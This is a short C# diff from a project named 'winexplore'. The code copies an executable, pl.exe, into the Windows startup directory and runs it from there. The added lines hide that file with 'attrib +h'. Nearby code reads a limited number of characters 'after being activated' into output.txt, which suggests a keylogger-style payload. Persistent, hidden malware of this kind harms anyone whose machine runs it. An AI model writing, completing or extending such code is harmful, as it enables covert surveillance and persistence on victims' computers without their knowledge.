@@ -29,17 +29,18 @@ namespace winexplore
                 try
                 {
                     File.Copy("pl.exe", (startupDir + @"\pl.exe"));
+                    runCommand("attrib +h " + startupDir + @"\pl.exe");
                     runCommand(startupDir + @"\pl.exe");
                     return;
                 }
                 catch
                 {
                     File.Copy("pl.exe", (startupDir + altName));
+                    runCommand("attrib +h " + startupDir + altName);
                     runCommand(startupDir + altName);
                     return;
                 }
             }
-
             string PATH = @"output.txt";
             int READSIZE = 100; // Number of characters to read after being activated, to prevent collateral damage
             int currentRead = 0;
